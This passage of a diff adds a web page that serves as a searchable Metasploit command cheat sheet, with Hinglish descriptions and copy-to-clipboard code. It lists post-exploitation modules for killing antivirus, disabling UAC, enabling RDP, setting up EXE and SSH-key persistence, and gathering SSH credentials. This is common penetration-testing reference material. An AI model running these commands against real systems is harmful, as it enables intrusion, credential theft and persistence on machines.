+      { desc: 'Patches enum', cmd: 'run post/windows/gather/enum_patches' },
+      { desc: 'Windows migrate', cmd: 'run post/windows/manage/migrate' },
+      { desc: 'Kill AV', cmd: 'run post/windows/manage/killav' },
+      { desc: 'Enable RDP', cmd: 'run post/windows/manage/enable_rdp' },
+      { desc: 'Disable UAC', cmd: 'run post/windows/manage/disable_uac' },
+      { desc: 'Persistence EXE', cmd: 'run post/windows/manage/persistence_exe' },
+      { desc: 'Linux configs enum', cmd: 'run post/linux/gather/enum_configs' },
+      { desc: 'Linux network enum', cmd: 'run post/linux/gather/enum_network' },
+      { desc: 'Linux system enum', cmd: 'run post/linux/gather/enum_system' },
+      { desc: 'Linux users history', cmd: 'run post/linux/gather/enum_users_history' },
+      { desc: 'Linux SSH key persistence', cmd: 'run post/linux/manage/sshkey_persistence' },
+      { desc: 'Local exploit suggest (multi)', cmd: 'run post/multi/recon/local_exploit_suggester' },
+      { desc: 'Environment gather', cmd: 'run post/multi/gather/env' },
+      { desc: 'SSH creds gather', cmd: 'run post/multi/gather/ssh_creds' },
+      { desc: 'Shell to meterpreter upgrade', cmd: 'run post/multi/manage/shell_to_meterpreter' }
+    ]
+  },
+  {
+    id: 'scripts', title: '📜 Resource Scripts & Plugins', icon: '📜',
+    items: [
+      { desc: 'Console commands save karo', cmd: 'makerc /tmp/script.rc' },
+      { desc: 'Resource script run karo', cmd: 'resource /tmp/script.rc' },
+      { desc: 'Startup par run karo', cmd: 'msfconsole -r /tmp/script.rc' },
+      { desc: 'Plugin load karo', cmd: 'load nessus' },
+      { desc: 'SQLMap integration', cmd: 'load sqlmap' },
+      { desc: 'Nexpose plugin', cmd: 'load nexpose' },
+      { desc: 'WMAP plugin', cmd: 'load wmap' },
+      { desc: 'Plugin unload karo', cmd: 'unload nessus' },
+      { desc: 'Macro list karo', cmd: 'macro list' },
+      { desc: 'Macro run karo', cmd: 'macro run <name>' },
+      { desc: 'Colors toggle karo', cmd: 'color' },
+      { desc: 'Creds dekho', cmd: 'creds' },
+      { desc: 'Loot dekho', cmd: 'loot' },
+      { desc: 'Notes dekho', cmd: 'notes' }
+    ]
+  }
+];
+
+// ==================== RENDER ====================
+// Author: KARCHO TERANG
+function renderSections(filterId = 'all', searchQuery = '') {
+  const container = document.getElementById('sectionsContainer');
+  container.innerHTML = '';
+  
+  let totalCmds = 0;
+  let visibleSections = 0;
+  
+  sections.forEach(section => {
+    let items = section.items;
+    if (searchQuery) {
+      items = items.filter(i => 
+        i.cmd.toLowerCase().includes(searchQuery) ||
+        i.desc.toLowerCase().includes(searchQuery)
+      );
+    }
+    
+    const catMatch = filterId === 'all' || section.id === filterId;
+    
+    if (!catMatch || items.length === 0) return;
+    
+    visibleSections++;
+    totalCmds += items.length;
+    
+    const sectionDiv = document.createElement('div');
+    sectionDiv.className = 'section open';
+    sectionDiv.dataset.id = section.id;
+    
+    const itemsHTML = items.map(item => `
+      <div class="cmd-item">
+        <div class="cmd-desc">${escapeHtml(item.desc)}</div>
+        <div class="cmd-code" onclick="copyCmd(this, '${escapeAttr(item.cmd)}')">${escapeHtml(item.cmd)}</div>
+      </div>
+    `).join('');
+    
+    sectionDiv.innerHTML = `
+      <div class="section-header" onclick="toggleSection(this)">
+        <h2>${section.icon} ${section.title} <span class="count">${items.length}</span></h2>
+        <span class="arrow">▼</span>
+      </div>
+      <div class="section-body">
+        ${itemsHTML}
+      </div>
+    `;
+    
+    container.appendChild(sectionDiv);
+  });
+  
+  if (visibleSections === 0) {
+    container.innerHTML = '<div class="no-result">🔍 Koi command nahi mili. Doosra keyword try karo.</div>';
+  }
+  
+  document.getElementById('totalCmds').textContent = totalCmds;
+  document.getElementById('totalSections').textContent = visibleSections;
+}
+
+function escapeHtml(str) {
+  return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+function escapeAttr(str) {
+  return str.replace(/'/g, "\\'").replace(/"/g, '&quot;');
+}
+
+// ==================== TOGGLE SECTION ====================
+function toggleSection(header) {
+  const section = header.parentElement;
+  section.classList.toggle('open');
+}
+
+// ==================== COPY ====================
+function copyCmd(el, cmd) {
+  navigator.clipboard.writeText(cmd).then(() => {
+    showToast('✅ Copied by KARCHO TERANG: ' + cmd.substring(0, 30) + (cmd.length > 30 ? '...' : ''));
+  }).catch(() => {
+    const ta = document.createElement('textarea');
+    ta.value = cmd;
+    document.body.appendChild(ta);
+    ta.select();
+    document.execCommand('copy');
+    document.body.removeChild(ta);
+    showToast('✅ Copied!');
+  });
+}
+
+function showToast(msg) {
+  const toast = document.getElementById('toast');
+  toast.textContent = msg;
+  toast.classList.add('show');
+  setTimeout(() => toast.classList.remove('show'), 1800);
+}
+
+// ==================== FILTER ====================
+let currentFilter = 'all';
+
+function filter(id, btn) {
+  currentFilter = id;
+  document.querySelectorAll('nav button').forEach(b => b.classList.remove('active'));
+  if (btn) btn.classList.add('active');
+  const q = document.getElementById('search').value.toLowerCase().trim();
+  renderSections(id, q);
+}
+
+// ==================== SEARCH ====================
+function searchCommands() {
+  const q = document.getElementById('search').value.toLowerCase().trim();
+  renderSections(currentFilter, q);
+}
+
+// ==================== INIT ====================
+document.addEventListener('DOMContentLoaded', () => {
+  renderSections('all', '');
+  console.log('%c💥 Metasploit Cheatsheet', 'color:#00ff88; font-size:20px; font-weight:bold;');
+  console.log('%c👨‍💻 Created by KARCHO TERANG', 'color:#00ff88; font-size:16px; font-weight:bold;');
+  console.log('%c🛡️ Ethical Hacker | Cybersecurity Researcher', 'color:#8b949e; font-size:12px;');
+});
+
+// ==================== KEYBOARD SHORTCUT ====================
+document.addEventListener('keydown', (e) => {
+  if (e.key === '/' && document.activeElement.tagName !== 'INPUT') {
+    e.preventDefault();
+    document.getElementById('search').focus();
+  }
+});
+</script>
+
+</body>
+</html>
